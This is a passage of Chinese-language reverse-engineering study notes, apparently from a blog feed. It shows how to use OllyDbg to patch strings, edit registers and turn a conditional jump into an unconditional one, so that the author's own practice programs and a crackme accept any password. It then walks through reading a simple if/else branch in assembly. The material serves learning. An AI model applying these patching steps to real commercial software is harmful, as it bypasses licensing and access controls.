<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220303155524710.png" alt="image-20220303155524710" /></p>
<p>找到 <code>main函数</code></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220303155958921.png" alt="image-20220303155958921" /></p>
<p>添加断点</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220303160155673.png" alt="image-20220303160155673" /></p>
<p>同时也可以看到 &quot; <code>Hello 21r000!</code> &quot; 是如何传给 <code>main函数</code> 的，通过 <code>push函数</code> 将字符串压入栈中，这样一来 <code>9020F8</code>  地址中就存储了该字符串的数据信息</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220303160314968.png" alt="image-20220303160314968" /></p>
<p>右键选择 &quot;转到&quot;-&gt;&quot;表达式&quot; 之后在弹窗中填写地址信息</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220303160530843.png" alt="image-20220303160530843" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220303160631304.png" alt="image-20220303160631304" /></p>
<p>就可以看到它所存储的信息</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220303160655410.png" alt="image-20220303160655410" /></p>
<p>此时直接在这个地址上右键 -&gt;&quot;二进制&quot;-&gt;&quot;编辑&quot;</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220303160820014.png" alt="image-20220303160820014" /></p>
<p>即可对该处数据信息进行更改，同时左下角勾选 &quot;保持大小&quot;，因为不保持大小可能会将后面的数据信息淹没</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220303160912004.png" alt="image-20220303160912004" /></p>
<p>将原字符串更改为 &quot; <code>Hello World!!</code> &quot;，同时在 <code>HEX数据</code> 中也可以看到被修改的数据信息</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220303161137903.png" alt="image-20220303161137903" /></p>
<p>此时再对其进行调试就会发现控制台输出的字符串变成了 &quot; <code>Hello World!!</code> &quot;</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220303173815909.png" alt="image-20220303173815909" /></p>
<h2 id="修改地址信息"><a class="anchor" href="#修改地址信息">#</a> 修改地址信息</h2>
<p><code>Ctrl + F2</code>  重新运行</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220303174106738.png" alt="image-20220303174106738" /></p>
<p><code>9020F8</code>  是一个地址，那我们也可以替换掉它的地址信息来进行修改</p>
<p>任意选取一段地址信息进行修改</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220303174424369.png" alt="image-20220303174424369" /></p>
<p>修改为如下信息，并将最后两个改为 &quot; <code>0A 00</code> &quot;，而&quot; <code>0A</code> &quot;为回车，&quot; <code>00</code> &quot; 为结尾</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220303174559690.png" alt="image-20220303174559690" /></p>
<p>点击确定后可以看到地址信息被修改</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220303174817857.png" alt="image-20220303174817857" /></p>
<p>此时回到 <code>主函数main</code>  部分，双击打开汇编</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220303174932526.png" alt="image-20220303174932526" /></p>
<p>将地址信息替换为刚刚修改的地址</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220303175031954.png" alt="image-20220303175031954" /></p>
<p>点击 &quot;汇编&quot; 后可以发现信息被修改</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220303175233672.png" alt="image-20220303175233672" /></p>
<p>此时我们再进行调试可以发现输出信息便为 &quot; <code>21r000 Hello !</code> &quot;</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220303175423101.png" alt="image-20220303175423101" /></p>
<h2 id="作用"><a class="anchor" href="#作用">#</a> 作用</h2>
<p>在破解的过程中可能需要一些条件来进行破解，比如某一字符串预留了一个密码为 &quot; <code>123456</code> &quot;</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220303175753992.png" alt="image-20220303175753992" /></p>
<p>此时要求这一字符串与该密码一致，在这种情况下我们就可以通过以上两种方式来进行修改，从而达到破解条件。</p>
]]></content>
      <categories>
        <category>逆向工程</category>
      </categories>
      <tags>
        <tag>逆向工程</tag>
      </tags>
  </entry>
  <entry>
    <title>逆向工程Studying Notes Days 3</title>
    <url>/article/5c387dcc.html</url>
    <content><![CDATA[<p>师傅们好像都在没日没夜的日站，忒恐怖了叭也</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220307203427534.png" alt="image-20220307203427534" /></p>
<h1 id="控制台"><a class="anchor" href="#控制台">#</a> 控制台</h1>
<h2 id="源代码分析"><a class="anchor" href="#源代码分析">#</a> 源代码分析</h2>
<p>用 ollydbg 打开我们要破解的程序，找到 <code>主函数main</code></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220307191720816.png" alt="image-20220307191720816" /></p>
<p>分析源代码</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220307192234453.png" alt="image-20220307192234453" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220307192517505.png" alt="image-20220307192517505" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220307192707903.png" alt="image-20220307192707903" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220307193608199.png" alt="image-20220307193608199" /></p>
<h2 id="破解思路"><a class="anchor" href="#破解思路">#</a> 破解思路</h2>
<ul>
<li>
<p>修改跳转，使得跳转到我们想要的地方，修改跳转地址使其无论输入什么登录成功</p>
</li>
<li>
<p>修改关键变量的值，就是 eax</p>
</li>
</ul>
<p>在 eax 处断点</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220307194853468.png" alt="image-20220307194853468" /></p>
<p>此时在输入框任意输入字符串，使其运行到断点处</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220307194930143.png" alt="image-20220307194930143" /></p>
<p>在右侧寄存器处修改 eax 的值，大于 6 即可</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220307195109348.png" alt="image-20220307195109348" /></p>
<p>这里我们修改为 10 进行测试</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220307195155973.png" alt="image-20220307195155973" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220307195212961.png" alt="image-20220307195212961" /></p>
<p>只要 eax &gt; 6 就可以成功。</p>
<ul>
<li>通过分析，得到正确的 passwd</li>
</ul>
<p>之前源代码分析的时候有对它的对比值进行分析也即</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">0x32</span> <span class="token number">0x31</span> <span class="token number">0x72</span> <span class="token number">0x30</span> <span class="token number">0x30</span> <span class="token number">0x30</span> <span class="token number">0x0</span></pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220307192707903.png" alt="image-20220307192707903" /></p>
<p>在下方打开二进制进行编辑</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220307195832043.png" alt="image-20220307195832043" /></p>
<p>在 HEX 编辑中输入我们的对比值</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220307195900668.png" alt="image-20220307195900668" /></p>
<p>如此就可以得到我们正确的 passwd 为 <code>21r000</code></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220307200011752.png" alt="image-20220307200011752" /></p>
<p>输入 passwd 即可发现登录成功</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220307200135338.png" alt="image-20220307200135338" /></p>
<ul>
<li>修改需要对比的字符串，使得与我们输入的一致</li>
</ul>
<p>这里是对它对比的字符串编码进行更改</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220307192707903.png" alt="image-20220307192707903" /></p>
<p>这里我们将 32、31 和 72 改为 30 进行测试</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220307200400212.png" alt="image-20220307200400212" /></p>
<p>修改后如下</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220307200449158.png" alt="image-20220307200449158" /></p>
<p>运行程序进行测试，输入 &quot; <code>000000</code> &quot; 登录成功</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220307200531245.png" alt="image-20220307200531245" /></p>
<h2 id="测试源代码"><a class="anchor" href="#测试源代码">#</a> 测试源代码</h2>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span></pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>	<span class="token keyword">char</span> pwd<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token char">'2'</span><span class="token punctuation">,</span> <span class="token char">'1'</span><span class="token punctuation">,</span> <span class="token char">'r'</span><span class="token punctuation">,</span> <span class="token char">'0'</span><span class="token punctuation">,</span> <span class="token char">'0'</span><span class="token punctuation">,</span> <span class="token char">'0'</span><span class="token punctuation">,</span> <span class="token number">0</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Please input your password: \n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>	<span class="token keyword">char</span> inpwd<span class="token punctuation">[</span><span class="token number">50</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token number">0</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>	<span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>inpwd<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>	<span class="token keyword">int</span> nflag <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>	<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">6</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="13"></td><td><pre>	<span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>		<span class="token keyword">if</span> <span class="token punctuation">(</span>pwd<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> inpwd<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="15"></td><td><pre>		<span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>			nflag<span class="token operator">++</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>		<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>	<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>	<span class="token keyword">if</span> <span class="token punctuation">(</span>nflag <span class="token operator">></span> <span class="token number">6</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="20"></td><td><pre>	<span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="21"></td><td><pre>		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Login sucess!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="22"></td><td><pre>	<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="23"></td><td><pre>	<span class="token keyword">else</span></pre></td></tr><tr><td data-num="24"></td><td><pre>	<span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="25"></td><td><pre>		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Login failed!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="26"></td><td><pre>	<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="27"></td><td><pre>	<span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"pause"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="28"></td><td><pre>	<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="29"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><h1 id="mfc破解"><a class="anchor" href="#mfc破解">#</a> MFC 破解</h1>
<p>双击应用程序，弹出输入框</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220313160703192.png" alt="image-20220313160703192" /></p>
<p>输入任意字符进行测试，登录失败弹出 <code>login failed!</code></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220313160726232.png" alt="image-20220313160726232" /></p>
<h2 id="尝试破解"><a class="anchor" href="#尝试破解">#</a> 尝试破解</h2>
<p>使用 <code>olldbg</code>  将应用程序打开</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220313160840995.png" alt="image-20220313160840995" /></p>
<p>右键查找，选择 <code>所有可参考字符串</code></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220313160919903.png" alt="image-20220313160919903" /></p>
<p>加载完成后查找字符 <code>login</code></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220313161006569.png" alt="image-20220313161006569" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220313161039883.png" alt="image-20220313161039883" /></p>
<p>双击进入 <code>主函数main</code>  板块</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220313161108356.png" alt="image-20220313161108356" /></p>
<p>通过修改 <code>je跳转</code> 的方式进行破解</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220313161142942.png" alt="image-20220313161142942" /></p>
<p>修改为 <code>JMP SHORT 00DA11BC</code></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220313161241083.png" alt="image-20220313161241083" /></p>
<p>运行程序查看破解效果</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220313161321199.png" alt="image-20220313161321199" /></p>
<p>此时可以看到登录成功，此外也可以参考上文通过修改登录密码的方式进行破解。</p>
<h1 id="第一个cm破解"><a class="anchor" href="#第一个cm破解">#</a> 第一个 CM 破解</h1>
<p>点击运行程序，弹出两个弹窗后运行结束</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220313162308541.png" alt="image-20220313162308541" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220313162318107.png" alt="image-20220313162318107" /></p>
<p>通过 <code>ollydbg</code>  打开应用程序，可以发现直接进入 <code>主函数main</code>  板块</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220313162603764.png" alt="image-20220313162603764" /></p>
<p>以此判断该应用程序是使用汇编语言进行编写的，且大小非常小</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220313162659552.png" alt="image-20220313162659552" /></p>
<h2 id="代码分析"><a class="anchor" href="#代码分析">#</a> 代码分析</h2>
<h3 id="第一层代码分析"><a class="anchor" href="#第一层代码分析">#</a> 第一层代码分析</h3>
<ul>
<li><code>MessageBoxA</code> ：弹出效应框的 <code>api</code></li>
<li>四个参数：
<ul>
<li><code>hOwner</code> ：句柄</li>
<li><code>Text</code> ：文本信息</li>
<li><code>Title</code> ：标题</li>
<li><code>Style</code> ：控制 &quot;确定&quot;</li>
</ul>
</li>
<li><code>GetDriveTypeA</code> ：获取驱动类型</li>
</ul>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220313163146986.png" alt="image-20220313163146986" /></p>
<h3 id="第二层代码分析"><a class="anchor" href="#第二层代码分析">#</a> 第二层代码分析</h3>
<ul>
<li><code>je</code> ：条件跳转，判断是否符合条件进行跳转</li>
<li>两个跳转分支：
<ul>
<li><code>Error</code></li>
<li><code>YEAH</code></li>
</ul>
</li>
<li><code>ExitProcess</code> ：结束，退出进程</li>
</ul>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220313163240442.png" alt="image-20220313163240442" /></p>
<h3 id="尝试修改"><a class="anchor" href="#尝试修改">#</a> 尝试修改</h3>
<h4 id="改关键跳"><a class="anchor" href="#改关键跳">#</a> 改关键跳</h4>
<p>通过以上代码分析可以发现 <code>JE</code>  处为关键跳转</p>
<p>采用修改 <code>JE条件跳转</code> 为 <code>JMP的无条件跳转</code> 进行破解</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220313163752895.png" alt="image-20220313163752895" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220313163832776.png" alt="image-20220313163832776" /></p>
<p>运行弹窗</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220313163952072.png" alt="image-20220313163952072" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220313164003712.png" alt="image-20220313164003712" /></p>
<p>破解成功！</p>
<h4 id="强行跳转"><a class="anchor" href="#强行跳转">#</a> 强行跳转</h4>
<p>在不破坏堆栈平衡的情况下，在任意位置进行跳转</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220313164251105.png" alt="image-20220313164251105" /></p>
<p>修改完成后进行调试</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220313164316856.png" alt="image-20220313164316856" /></p>
<p>破解成功！</p>
]]></content>
      <categories>
        <category>逆向工程</category>
      </categories>
      <tags>
        <tag>逆向工程</tag>
      </tags>
  </entry>
  <entry>
    <title>逆向工程Studying Notes Days 4</title>
    <url>/article/bd1d4346.html</url>
    <content><![CDATA[<h1 id="ifelse单分支"><a class="anchor" href="#ifelse单分支">#</a> ifelse 单分支</h1>
<p>分支结构只有一个 <code>if/else</code></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220320181621977.png" alt="image-20220320181621977" /></p>
<h2 id="debug版识别"><a class="anchor" href="#debug版识别">#</a> Debug 版识别</h2>
<p>我们现用 <code>ollydbg</code>  打开后找到 <code>主函数main</code>  的位置：</p>
<p><strong>第一种方法：</strong></p>
<p>打开程序后执行 <code>F8</code></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220320154857740.png" alt="image-20220320154857740" /></p>
<p>当执行 <code>F8</code>  到 <code>call</code>  位置时，弹窗提示 “请输入 flag：”</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220320155122143.png" alt="image-20220320155122143" /></p>
<p>此时我们随意输入一组数据然后回车，进入如下板块</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220320155243814.png" alt="image-20220320155243814" /></p>
<p>可以知道上面的 <code>call</code>  为主函数的上层目录</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220320155406765.png" alt="image-20220320155406765" /></p>
<p>重新进行调试， <code>F8</code>  执行到 <code>call</code>  时按 <code>F7</code>  进入，显示如下：</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220320155446312.png" alt="image-20220320155446312" /></p>
<p>此时又能看到两个 <code>call</code>  函数，继续执行 <code>F8</code>  到第二个 <code>call函数</code> 时再次弹出 “请输入 flag：”</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220320155622033.png" alt="image-20220320155622033" /></p>
<p>记录一个断点</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220320155740426.png" alt="image-20220320155740426" /></p>
<p>再次重新调试后，执行 <code>F9</code>  将直接进入第一个断点处</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220320155850110.png" alt="image-20220320155850110" /></p>
<p>再次按下 <code>F9</code>  进入到第二个断点处</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220320155918941.png" alt="image-20220320155918941" /></p>
<p>此时在执行 <code>F7</code>  进入</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220320160014524.png" alt="image-20220320160014524" /></p>
<p>然后继续执行 <code>F8</code> ，直到再次弹出 “请输入 flag：”</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220320160042205.png" alt="image-20220320160042205" /></p>
<p>进行断点后，继续进行调试</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220320160125678.png" alt="image-20220320160125678" /></p>
<p><strong>第二种发法：</strong></p>
<p>根据弹窗提示进行字符串查找</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220320160434221.png" alt="image-20220320160434221" /></p>
<p>找到关键字符串后双击进入</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220320160547136.png" alt="image-20220320160547136" /></p>
<p>即可找到主函数模块</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220320162230323.png" alt="image-20220320162230323" /></p>
<h3 id="分析主函数main"><a class="anchor" href="#分析主函数main">#</a> 分析主函数 main</h3>
<p>断点对主函数进行分析</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220320162236740.png" alt="image-20220320162236740" /></p>
<p>对 <code>00ADA24D</code>  处的 <code>CALL Test.00AD6516</code>  函数进行分析：</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">00</span>ADA24D  <span class="token operator">|</span><span class="token punctuation">.</span>  E8 C4C2FFFF   CALL Test<span class="token punctuation">.</span><span class="token number">00</span>AD6516</pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre>猜测是printf，但不确定</pre></td></tr><tr><td data-num="4"></td><td><pre>因为有可能是这个字符串被压入堆栈，然后在函数内部被调用，然后输出</pre></td></tr><tr><td data-num="5"></td><td><pre>例如：</pre></td></tr><tr><td data-num="6"></td><td><pre>    <span class="token keyword">int</span> <span class="token function">function00AD54EF</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span> string<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>        <span class="token comment">//xxxxcode</span></pre></td></tr><tr><td data-num="9"></td><td><pre>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span>string<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>        <span class="token comment">//xxxxcode</span></pre></td></tr><tr><td data-num="11"></td><td><pre>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>所以说猜测它是输出函数，或者包含输出函数的函数</pre></td></tr></table></figure><p>对 <code>00ADA252</code>  处的 <code>ADD ESP,4</code>  进行分析：</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">00</span>ADA252  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">83</span>C4 <span class="token number">04</span>       ADD ESP<span class="token punctuation">,</span><span class="token number">4</span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre>堆栈平衡</pre></td></tr></table></figure><p>对 <code>00ADA255</code>  处的 <code>MOV DWORD PTR SS:[EBP-C],0</code>  进行分析：</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">00</span>ADA255  <span class="token operator">|</span><span class="token punctuation">.</span>  C745 F4 <span class="token number">00000</span><span class="token operator">></span>MOV DWORD PTR SS<span class="token operator">:</span><span class="token punctuation">[</span>EBP<span class="token operator">-</span>C<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">0</span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre>把<span class="token number">0</span>赋值给ebp<span class="token operator">-</span>c，局部变量</pre></td></tr><tr><td data-num="4"></td><td><pre>ebp<span class="token operator">+</span> <span class="token operator">*</span> 参数</pre></td></tr><tr><td data-num="5"></td><td><pre>ebp<span class="token operator">-</span> <span class="token operator">*</span> 局部变量</pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token keyword">int</span> nNumber <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr></table></figure><p>对 <code>00ADA25C</code>  处的 <code>LEA EAX,DWORD PTR SS:[EBP-C]</code>  进行分析：</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">00</span>ADA25C  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">8</span>D45 F4       LEA EAX<span class="token punctuation">,</span>DWORD PTR SS<span class="token operator">:</span><span class="token punctuation">[</span>EBP<span class="token operator">-</span>C<span class="token punctuation">]</span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre>不是 eax<span class="token operator">=</span> <span class="token number">0</span>的意思</pre></td></tr><tr><td data-num="4"></td><td><pre>lea是地址传送指令</pre></td></tr><tr><td data-num="5"></td><td><pre>所以这一句的意思是把dword ptr <span class="token punctuation">[</span>ebp<span class="token operator">-</span>c<span class="token punctuation">]</span>的地址传送到eax中</pre></td></tr></table></figure><p>F8 执行到 [ebp-c] 处</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220320162854182.png" alt="image-20220320162854182" /></p>
<p>右键转到 ebp</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220320162936704.png" alt="image-20220320162936704" /></p>
<p>可以看到 ebp-c 的地址</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220320163027940.png" alt="image-20220320163027940" /></p>
<p>再次执行 F8 后转到 ebp</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220320163052729.png" alt="image-20220320163052729" /></p>
<p>解析位置如下</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220320163144248.png" alt="image-20220320163144248" /></p>
